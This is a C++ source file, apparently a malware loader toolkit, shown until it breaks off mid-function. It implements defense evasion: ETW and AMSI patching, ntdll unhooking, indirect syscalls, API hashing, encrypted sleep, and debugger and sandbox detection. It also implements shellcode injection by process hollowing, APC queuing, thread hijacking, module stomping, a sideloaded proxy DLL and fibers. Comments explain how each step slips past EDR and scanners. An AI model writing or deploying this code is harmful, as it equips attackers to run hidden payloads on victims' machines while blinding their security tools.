#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <memory>
#include <tlhelp32.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <intrin.h>
#include <ntstatus.h>
#include <subauth.h>
#include <vector>
#include <array>
#include <span>
#include <bit>
#include <optional>
#include <functional>
#include <thread>
#include <atomic>
#include <chrono>


#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")


typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG      TimeDateStamp;
} LDR_DATA_TABLE_ENTRY_FULL;


typedef struct _PEB_LDR_DATA_FULL {
    ULONG      Length;
    BOOLEAN    Initialized;
    HANDLE     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_FULL;

typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS_FULL;

typedef struct _PEB_FULL {
    BYTE                              Reserved1[2];
    BYTE                              BeingDebugged;
    BYTE                              Reserved2[1];
    PVOID                             Reserved3[2];
    PEB_LDR_DATA_FULL*                Ldr;
    RTL_USER_PROCESS_PARAMETERS_FULL* ProcessParameters;
    PVOID                             Reserved4[3];
    PVOID                             AtlThunkSListPtr;
    PVOID                             Reserved5;
    ULONG                             Reserved6;
    PVOID                             Reserved7;
    ULONG                             Reserved8;
    ULONG                             AtlThunkSListPtr32;
    PVOID                             Reserved9[45];
    BYTE                              Reserved10[96];
    PVOID                             PostProcessInitRoutine;
    BYTE                              Reserved11[128];
    PVOID                             Reserved12[1];
    ULONG                             SessionId;
} PEB_FULL;

using NtOpenProcess_t            = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK,
                                                    POBJECT_ATTRIBUTES,
                                                    PCLIENT_ID);
using NtClose_t                  = NTSTATUS(NTAPI*)(HANDLE);
using NtQuerySystemInformation_t = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
using NtDuplicateObject_t        = NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE,
                                                    PHANDLE, ACCESS_MASK,
                                                    ULONG, ULONG);
using NtReadVirtualMemory_t      = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID,
                                                    SIZE_T, PSIZE_T);
using NtSuspendThread_t          = NTSTATUS(NTAPI*)(HANDLE, PULONG);
using NtResumeThread_t           = NTSTATUS(NTAPI*)(HANDLE, PULONG);
using NtGetContextThread_t       = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
using NtSetContextThread_t       = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
using NtUnmapViewOfSection_t     = NTSTATUS(NTAPI*)(HANDLE, PVOID);
using NtMapViewOfSection_t       = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*,
                                                    ULONG_PTR, SIZE_T,
                                                    PLARGE_INTEGER, PSIZE_T,
                                                    ULONG, ULONG, ULONG);
using NtCreateSection_t          = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK,
                                                    POBJECT_ATTRIBUTES,
                                                    PLARGE_INTEGER, ULONG,
                                                    ULONG, HANDLE);
using NtDelayExecution_t         = NTSTATUS(NTAPI*)(BOOLEAN, PLARGE_INTEGER);
using NtQueryInformationProcess_t= NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS,
                                                    PVOID, ULONG, PULONG);
using NtSetInformationThread_t   = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG);

// string XOR encryption
// compile time key, decrypt at runtime, static strings never land in plaintext
constexpr uint8_t XOR_KEY = 0xAB;

std::string xor_decrypt(const uint8_t* data, size_t len) {
    std::string out(len, '\0');
    for (size_t i = 0; i < len; i++) out[i] = data[i] ^ XOR_KEY;
    return out;
}

#define ENC(s) []() { \
    constexpr size_t N = sizeof(s) - 1; \
    uint8_t buf[N]; \
    for (size_t i = 0; i < N; i++) buf[i] = ((uint8_t)s[i]) ^ XOR_KEY; \
    return xor_decrypt(buf, N); }()

// import hashing (djb2)
// resolve APIs without calling GetProcAddress by name — bypass import-name scan
constexpr uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) + (uint8_t)*s++;
    return h;
}

FARPROC resolve_export(HMODULE mod, uint32_t target_hash) {
    auto base = reinterpret_cast<uint8_t*>(mod);
    auto dos   = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt    = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto& edir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto  exp  = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(base + edir.VirtualAddress);

    auto names    = reinterpret_cast<uint32_t*>(base + exp->AddressOfNames);
    auto ordinals = reinterpret_cast<uint16_t*>(base + exp->AddressOfNameOrdinals);
    auto funcs    = reinterpret_cast<uint32_t*>(base + exp->AddressOfFunctions);

    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        const char* name = reinterpret_cast<const char*>(base + names[i]);
        if (djb2(name) == target_hash)
            return reinterpret_cast<FARPROC>(base + funcs[ordinals[i]]);
    }
    return nullptr;
}


// indirect syscalls
// extract SSN from ntdll, build a stub, call kernel directly
// slips past EDR hooks sitting in ntdll usermode layer
struct SyscallStub {
    uint8_t  code[24];
    uint32_t ssn;
};

uint32_t get_ssn(const char* func_name) {
    HMODULE ntdll = GetModuelHandleA("ntdll.dll");
    auto fn = reinterpret_cast<uint8_t*>(GetProcAddress(ntdll, func_name));
    if (!fn) return 0xFFFFFFFF;
    // mov eax, <SSN> is at offset 4 in a standard Nt* stub
    // if hooked (jmp at byte 0), walk syscall stubs to find SSN by neighbor
    if (fn[0] == 0xE9 || fn[0] == 0xFF) {
        for (int delta = 1; delta < 500; delta++) {
            if (fn[delta * 32] == 0x4C && fn[delta * 32 + 1] == 0x8B &&
                fn[delta * 32 + 2] == 0xD1 && fn[delta * 32 + 3] == 0xB8)
                return *reinterpret_cast<uint32_t*>(fn + delta * 32 + 4) - delta;
            if (fn[-delta * 32] == 0x4C && fn[-delta * 32 + 1] == 0x8B &&
                fn[-delta * 32 + 2] == 0xD1 && fn[-delta * 32 + 3] == 0xB8)
                return *reinterpret_cast<uint32_t*>(fn - delta * 32 + 4) + delta;
        }
        return 0xFFFFFFFF;
    }
    return *reinterpret_cast<uint32_t*>(fn + 4);
}


// x64 syscall stub, written to executable memory at runtime
// mov r10, rcx | mov eax, ssn | syscall | ret
static const uint8_t STUB_TEMPLATE[] = {
    0x4C, 0x8B, 0xD1,              // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <SSN>  <- patched
    0x0F, 0x05,                    // syscall
    0xC3                           // ret
};

void* build_stub(uint32_t ssn) {
    void* mem = VirtualAlloc(nullptr, sizeof(STUB_TEMPLATE),
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return nullptr;
    memcpy(mem, STUB_TEMPLATE, sizeof(STUB_TEMPLATE));
    *reinterpret_cast<uint32_t*>(static_cast<uint8_t*>(mem) + 4) = ssn;
    return mem;
}

// typed wrappers, cast stub pointer and call like a real Nt function
using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR,
                                                    PSIZE_T, ULONG, ULONG);
using NtWriteVirtualMemory_t    = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID,
                                                    SIZE_T, PSIZE_T);
using NtProtectVirtualMemory_t  = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T,
                                                    ULONG, PULONG);
using NtCreateThreadEx_t        = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK,
                                                    PVOID, HANDLE, PVOID, PVOID,
                                                    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// ETW patching
// patch EtwEventWrite to ret immediately, kills usermode event telemetry
// EDR sensors that rely on ETW stop seeing your allocations and thread creates
bool patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto etw = reinterpret_cast<uint8_t*>(GetProcAddress(ntdll, "EtwEventWrite"));
    if (!etw) return false;

    DWORD old_prot;
    if (!VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_prot)) return false;
    *etw = 0xC3; // ret — function returns immediately, no events written
    VirtualProtect(etw, 1, old_prot, &old_prot);
    return true;
}

// AMSI bypass
// patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
// stops PowerShell / .NET AMSI hooks from scanning your shellcode
bool patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return true; // not loaded — not a threat

    auto scan = reinterpret_cast<uint8_t*>(
        GetProcAddress(amsi, "AmsiScanBuffer"));
    if (!scan) return false;

    // mov eax, 0x80070057 (E_INVALIDARG) ; ret
    // AMSI treats E_INVALIDARG as clean, scan never fires
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old_prot;
    VirtualProtect(scan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_prot);
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, sizeof(patch), old_prot, &old_prot);
    return true;
}

// ntdll unhooking
// map a fresh ntdll from disk, copy .text section over the loaded (hooked) copy
// EDR hooks live in the in memory ntdll, fresh disk copy has clean stubs
bool unhook_ntdll() {
    // open ntdll on disk
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, L"\\ntdll.dll");

    HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                              nullptr, OPEN_EXISTING, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;

    HANDLE mapping = CreateFileMappingW(file, nullptr, PAGE_READONLY | SEC_IMAGE,
                                        0, 0, nullptr);
    CloseHandle(file);
    if (!mapping) return false;

    auto fresh = reinterpret_cast<uint8_t*>(
        MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0));
    CloseHandle(mapping);
    if (!fresh) return false;

    HMODULE loaded = GetModuleHandleA("ntdll.dll");
    auto loaded_base = reinterpret_cast<uint8_t*>(loaded);

    // locate .text section in both copies, copy fresh over hooked
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(fresh);
    auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>(fresh + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);

    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old_prot;
            VirtualProtect(loaded_base + sec->VirtualAddress,
                           sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old_prot);
            memcpy(loaded_base + sec->VirtualAddress,
                   fresh + sec->VirtualAddress,
                   sec->Misc.VirtualSize);
            VirtualProtect(loaded_base + sec->VirtualAddress,
                           sec->Misc.VirtualSize,
                           old_prot, &old_prot);
            break;
        }
    }

    UnmapViewOfFile(fresh);
    return true;
}

// Ekko style sleep obfuscation
// encrypt shellcode in memory while sleeping, decrypt before next execution
// memory scanners that run during idle periods see only garbage bytes
void obfuscated_sleep(void* shellcode_base, size_t shellcode_size,
                      DWORD sleep_ms) {
    // XOR encrypt shellcode in place before sleeping
    auto sc = reinterpret_cast<uint8_t*>(shellcode_base);
    for (size_t i = 0; i < shellcode_size; i++) sc[i] ^= XOR_KEY;

    // flip region to RW (no execute) so scanners see non exec memory
    DWORD old_prot;
    VirtualProtect(shellcode_base, shellcode_size, PAGE_READWRITE, &old_prot);

    Sleep(sleep_ms);

    // restore RX and decrypt
    VirtualProtect(shellcode_base, shellcode_size, old_prot, &old_prot);
    for (size_t i = 0; i < shellcode_size; i++) sc[i] ^= XOR_KEY;
}

// full evasion init 
// call this before any payload work
// returns false if a critical step failed
struct EvasionResult {
    bool etw_ok;
    bool amsi_ok;
    bool unhook_ok;
    bool syscalls_ok;
};


// PEB walk, module resolution
HMODULE peb_get_module(const wchar_t* target) {
#ifdef _WIN64
    auto peb = reinterpret_cast<PEB_FULL*>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PEB_FULL*>(__readfsdword(0x30));
#endif
    auto ldr  = peb->Ldr;
    auto head = &ldr->InLoadOrderModuleList;
    auto cur  = head->Flink;

    while (cur != head) {
        auto entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY_FULL,
                                       InLoadOrderLinks);
        if (entry->BaseDllName.Buffer) {
            // case insensitive wide compare
            bool match = true;
            size_t len = wcslen(target);
            if (entry->BaseDllName.Length / 2 == len) {
                for (size_t i = 0; i < len; i++) {
                    if (towlower(entry->BaseDllName.Buffer[i]) != towlower(target[i])) {
                        match = false; break;
                    }
                }
                if (match)
                    return reinterpret_cast<HMODULE>(entry->DllBase);
            }
        }
        cur = cur->Flink;
    }
    return nullptr;
}


// anti debug, CPUID timing
// debugger overhead shows up as measurable latency on CPUID
bool detect_debugger_timing() {
    uint64_t t1 = __rdtsc();
    int cpuid_res[4];
    __cpuid(cpuid_res, 0);
    uint64_t t2 = __rdtsc();
    return (t2 - t1) > 500; // threshold tuned for modern hardware
}


// anti debug, NtGlobalFlag
bool detect_debugger_ntglobalflag() {
#ifdef _WIN64
    auto peb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    ULONG flag = *reinterpret_cast<ULONG*>(peb + 0xBC);
#else
    auto peb = reinterpret_cast<uint8_t*>(__readfsdword(0x30));
    ULONG flag = *reinterpret_cast<ULONG*>(peb + 0x68);
#endif
    return (flag & 0x70) != 0; // FLG_HEAP_ENABLE_TAIL_CHECK
}


// default heap gets extra flags when a debugger is attached
bool detect_debugger_heap() {
#ifdef _WIN64
    auto peb  = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    auto heap = *reinterpret_cast<uint8_t**>(peb + 0x30);
    ULONG flags      = *reinterpret_cast<ULONG*>(heap + 0x70);
    ULONG force_flags= *reinterpret_cast<ULONG*>(heap + 0x74);
#else
    auto peb  = reinterpret_cast<uint8_t*>(__readfsdword(0x30));
    auto heap = *reinterpret_cast<uint8_t**>(peb + 0x18);
    ULONG flags      = *reinterpret_cast<ULONG*>(heap + 0x40);
    ULONG force_flags= *reinterpret_cast<ULONG*>(heap + 0x44);
#endif
    return (flags & ~0x2) || force_flags;
}


// sandbox runs headless or with no mouse movement, real user has cursor history
bool detect_sandbox_mouse() {
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(1500);
    GetCursorPos(&p2);
    return (p1.x == p2.x && p1.y == p2.y); // no movement -> likely sandbox
}


bool detect_sandbox_uptime() {
    return GetTickCount64() < (10ULL * 60 * 1000); // under 10 min
}


// CPU count
bool detect_sandbox_cpu() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}


// sandbox VMs often have small disks, below 80 GB is a red flag
bool detect_sandbox_disk() {
    ULARGE_INTEGER free_bytes, total_bytes, total_free;
    if (!GetDiskFreeSpaceExW(L"C:\\", &free_bytes, &total_bytes, &total_free))
        return false;
    return total_bytes.QuadPart < (80ULL * 1024 * 1024 * 1024);
}


struct EnvCheck {
    bool debugger_timing;
    bool debugger_ntflag;
    bool debugger_heap;
    bool sandbox_mouse;
    bool sandbox_uptime;
    bool sandbox_cpu;
    bool sandbox_disk;
    bool hostile() const {
        return debugger_timing || debugger_ntflag || debugger_heap
            || sandbox_mouse   || sandbox_uptime
            || sandbox_cpu     || sandbox_disk;
    }
};

EnvCheck check_environment() {
    return {
        detect_debugger_timing(),
        detect_debugger_ntglobalflag(),
        detect_debugger_heap(),
        detect_sandbox_mouse(),
        detect_sandbox_uptime(),
        detect_sandbox_cpu(),
        detect_sandbox_disk(),
    };
}


DWORD find_pid(const wchar_t* target_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, target_name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}


std::vector<DWORD> enum_threads(DWORD target_pid) {
    std::vector<DWORD> tids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return tids;

    THREADENTRY32 te{ sizeof(te) };
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == target_pid)
                tids.push_back(te.th32ThreadID);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tids;
}


void nt_sleep(void* delay_stub, DWORD ms) {
    LARGE_INTEGER interval;
    interval.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL; // 100ns units
    auto NtDelay = reinterpret_cast<NtDelayExecution_t>(delay_stub);
    NtDelay(FALSE, &interval);
}


bool enable_privilege(const wchar_t* priv_name) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &token))
        return false;

    LUID luid;
    if (!LookupPrivilegeValueW(nullptr, priv_name, &luid)) {
        CloseHandle(token); return false;
    }

    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool ok = AdjustTokenPrivileges(token, FALSE, &tp,
                                    sizeof(tp), nullptr, nullptr)
              && GetLastError() == ERROR_SUCCESS;
    CloseHandle(token);
    return ok;
}


bool hollow_process(const wchar_t* host_path,
                    const uint8_t* payload_pe, size_t payload_size,
                    void* unmap_stub, void* map_stub) {
    auto NtUnmap = reinterpret_cast<NtUnmapViewOfSection_t>(unmap_stub);
    auto NtMap   = reinterpret_cast<NtMapViewOfSection_t>(map_stub);

    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(host_path, nullptr, nullptr, nullptr,
                        FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return false;

    PROCESS_BASIC_INFORMATION pbi{};
    auto NtQIP = reinterpret_cast<NtQueryInformationProcess_t>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"),
                       "NtQueryInformationProcess"));
    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    PVOID image_base_addr;
    SIZE_T bytes_read;
    ReadProcessMemory(pi.hProcess,
                      static_cast<uint8_t*>(pbi.PebBaseAddress) + 16,
                      &image_base_addr, sizeof(image_base_addr), &bytes_read);

    // unmap original image
    NtUnmap(pi.hProcess, image_base_addr);

    // parse payload PE headers
    auto dos    = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload_pe);
    auto nt     = reinterpret_cast<const IMAGE_NT_HEADERS*>(
                    payload_pe + dos->e_lfanew);
    SIZE_T img_size = nt->OptionalHeader.SizeOfImage;
    PVOID  pref_base= reinterpret_cast<PVOID>(
                    nt->OptionalHeader.ImageBase);

    // allocate at preferred base
    PVOID remote_base = VirtualAllocEx(pi.hProcess, pref_base, img_size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        // fallback: let OS pick address, requires reloc patching
        remote_base = VirtualAllocEx(pi.hProcess, nullptr, img_size,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    }
    if (!remote_base) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return false;
    }

    // write headers
    WriteProcessMemory(pi.hProcess, remote_base,
                       payload_pe, nt->OptionalHeader.SizeOfHeaders, nullptr);

    // write sections
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        WriteProcessMemory(pi.hProcess,
                           static_cast<uint8_t*>(remote_base) + sec->VirtualAddress,
                           payload_pe + sec->PointerToRawData,
                           sec->SizeOfRawData, nullptr);
    }

    // patch PEB image base
    WriteProcessMemory(pi.hProcess,
                       static_cast<uint8_t*>(pbi.PebBaseAddress) + 16,
                       &remote_base, sizeof(remote_base), nullptr);

    // redirect entry point
    CONTEXT ctx{ .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    uint64_t ep = reinterpret_cast<uint64_t>(remote_base)
                + nt->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
    ctx.Rcx = ep;
#else
    ctx.Eax = static_cast<DWORD>(ep);
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}


// APC early bird injection
bool apc_inject(HANDLE proc, HANDLE thread,
                const uint8_t* sc, size_t sc_len,
                void* alloc_stub, void* write_stub,
                void* protect_stub) {
    auto NtAlloc   = reinterpret_cast<NtAllocateVirtualMemory_t>(alloc_stub);
    auto NtWrite   = reinterpret_cast<NtWriteVirtualMemory_t>(write_stub);
    auto NtProtect = reinterpret_cast<NtProtectVirtualMemory_t>(protect_stub);

    PVOID  base  = nullptr;
    SIZE_T sz    = sc_len;
    NtAlloc(proc, &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return false;

    SIZE_T written;
    NtWrite(proc, base, const_cast<uint8_t*>(sc), sc_len, &written);

    ULONG old;
    NtProtect(proc, &base, &sz, PAGE_EXECUTE_READ, &old);

    QueueUserAPC(reinterpret_cast<PAPCFUNC>(base), thread, 0);
    return true;
}


// thread hijacking
bool hijack_thread(DWORD target_pid,
                   const uint8_t* sc, size_t sc_len,
                   void* alloc_stub, void* write_stub,
                   void* protect_stub,
                   void* suspend_stub, void* resume_stub,
                   void* getctx_stub,  void* setctx_stub) {
    auto NtAlloc   = reinterpret_cast<NtAllocateVirtualMemory_t>(alloc_stub);
    auto NtWrite   = reinterpret_cast<NtWriteVirtualMemory_t>(write_stub);
    auto NtProtect = reinterpret_cast<NtProtectVirtualMemory_t>(protect_stub);
    auto NtSuspend = reinterpret_cast<NtSuspendThread_t>(suspend_stub);
    auto NtResume  = reinterpret_cast<NtResumeThread_t>(resume_stub);
    auto NtGetCtx  = reinterpret_cast<NtGetContextThread_t>(getctx_stub);
    auto NtSetCtx  = reinterpret_cast<NtSetContextThread_t>(setctx_stub);

    auto tids = enum_threads(target_pid);
    if (tids.empty()) return false;

    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!proc) return false;

    // allocate + write + protect shellcode in target
    PVOID base = nullptr; SIZE_T sz = sc_len;
    NtAlloc(proc, &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    SIZE_T wr;
    NtWrite(proc, base, const_cast<uint8_t*>(sc), sc_len, &wr);
    ULONG old;
    NtProtect(proc, &base, &sz, PAGE_EXECUTE_READ, &old);

    // pick first thread
    HANDLE thr = OpenThread(THREAD_ALL_ACCESS, FALSE, tids[0]);
    if (!thr) { CloseHandle(proc); return false; }

    NtSuspend(thr, nullptr);

    CONTEXT ctx{ .ContextFlags = CONTEXT_FULL };
    NtGetCtx(thr, &ctx);

    // save original RIP so shellcode can return cleanly
    // (prepend a small trampoline or just clobber, clobber for demo)
#ifdef _WIN64
    ctx.Rip = reinterpret_cast<uint64_t>(base);
#else
    ctx.Eip = reinterpret_cast<uint32_t>(base);
#endif
    NtSetCtx(thr, &ctx);
    NtResume(thr, nullptr);

    CloseHandle(thr);
    CloseHandle(proc);
    return true;
}


// DLL sideloading harness
std::string generate_proxy_def(const std::string& original_dll,
                                const std::vector<std::string>& exports) {
    std::string def = "EXPORTS\n";
    for (auto& exp : exports) {
        // forward each export: ExportName = original.dll.ExportName
        def += "    " + exp + " = " + original_dll + "." + exp + "\n";
    }
    return def; // write to .def file, link with /DEF: flag
}

// DLL payload template, drop into dllmain.cpp of your proxy project
// runs shellcode in a new thread on DLL_PROCESS_ATTACH
// (actual shellcode bytes replaced at build time)
constexpr const char* PROXY_DLLMAIN_TEMPLATE = R"(
#include <windows.h>
static uint8_t sc[] = { /* shellcode bytes */ };
BOOL APIENTRY DllMain(HMODULE mod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(mod);
        PVOID mem = VirtualAlloc(nullptr, sizeof(sc),
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
        if (mem) {
            memcpy(mem, sc, sizeof(sc));
            CreateThread(nullptr, 0,
                         reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),
                         nullptr, 0, nullptr);
        }
    }
    return TRUE;
}
)";


// RC4 shellcode encryption
class RC4 {
    std::array<uint8_t, 256> s{};
    uint8_t i = 0, j = 0;
public:
    explicit RC4(std::span<const uint8_t> key) {
        for (int x = 0; x < 256; x++) s[x] = static_cast<uint8_t>(x);
        uint8_t k = 0;
        for (int x = 0; x < 256; x++) {
            k = k + s[x] + key[x % key.size()];
            std::swap(s[x], s[k]);
        }
    }
    void crypt(std::span<uint8_t> data) {
        for (auto& b : data) {
            i++;
            j = j + s[i];
            std::swap(s[i], s[j]);
            b ^= s[(s[i] + s[j]) & 0xFF];
        }
    }
};


// in memory RC4 decrypt before execution
bool rc4_decrypt_and_run(std::vector<uint8_t>& encrypted_sc,
                          std::span<const uint8_t> key,
                          void* alloc_stub, void* protect_stub) {
    auto NtAlloc   = reinterpret_cast<NtAllocateVirtualMemory_t>(alloc_stub);
    auto NtProtect = reinterpret_cast<NtProtectVirtualMemory_t>(protect_stub);

    // decrypt in place
    RC4 cipher(key);
    cipher.crypt(encrypted_sc);

    // allocate RW, write, flip RX
    HANDLE self   = GetCurrentProcess();
    PVOID  base   = nullptr;
    SIZE_T sz     = encrypted_sc.size();
    NtAlloc(self, &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return false;

    memcpy(base, encrypted_sc.data(), encrypted_sc.size());

    ULONG old;
    NtProtect(self, &base, &sz, PAGE_EXECUTE_READ, &old);

    // run in a fiber to avoid new thread detection
    PVOID fiber = ConvertThreadToFiber(nullptr);
    PVOID sc_fiber = CreateFiber(0,
        reinterpret_cast<LPFIBER_START_ROUTINE>(base), nullptr);
    SwitchToFiber(sc_fiber);
    return true;
}


// Stomping, module stomping
bool module_stomping(const wchar_t* target_dll,
                     const uint8_t* sc, size_t sc_len) {
    HMODULE mod = LoadLibraryExW(target_dll, nullptr,
                                 LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (!mod) return false;
    HMODULE full = LoadLibraryW(target_dll);
    if (!full) return false;

    auto base = reinterpret_cast<uint8_t*>(full);
    auto dos  = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt   = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto sec  = IMAGE_FIRST_SECTION(nt);

    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old;
            VirtualProtect(base + sec->VirtualAddress,
                           sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old);
            memcpy(base + sec->VirtualAddress, sc,
                   min(sc_len, static_cast<size_t>(sec->Misc.VirtualSize)));
            VirtualProtect(base + sec->VirtualAddress,
                           sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READ, &old);
            // jump into stomped region
            reinterpret_cast<void(*)()>(base + sec->VirtualAddress)();
            return true;
        }
    }
    return false;
}


// Heavens Gate, 32 bit to 64 bit transition
// for bypass WoW64 hooks on Nt* functions
#ifndef _WIN64
#pragma pack(push, 1)
struct HeavensGateStub {
    uint8_t  mov_eax;    // B8
    uint32_t ssn;        // <SSN>
    uint8_t  xor_rcx[3]; // 48 31 C9  (xor rcx,rcx — zero high bits)
    uint8_t  mov_r10[3]; // 4C 8B D1  (mov r10,rcx)
    uint8_t  syscall[2]; // 0F 05
    uint8_t  ret_far;    // CB        (retf)
};
#pragma pack(pop)

NTSTATUS heaven_call(uint32_t ssn, ...) {
    // build a 64 bit stub in RWX memory, call via far jmp
    static uint8_t trampoline[] = {
        0x6A, 0x33,              // push 0x33 (64 bit CS)
        0xE8, 0x00, 0x00, 0x00, 0x00, // call +0 (get EIP)
        0x83, 0x04, 0x24, 0x05,  // add [esp], 5
        0xCB,                    // retf -> now in 64 bit mode
        // 64 bit payload below:
        0x4C, 0x8B, 0xD1,        // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, ssn <- patched
        0x0F, 0x05,              // syscall
        0xE8, 0x00, 0x00, 0x00, 0x00, // call +0
        0x83, 0x04, 0x24, 0x07,  // add [esp], 7
        0xCB,                    // retf -> back to 32 bit
        0xC3                     // ret
    };
    // patch SSN
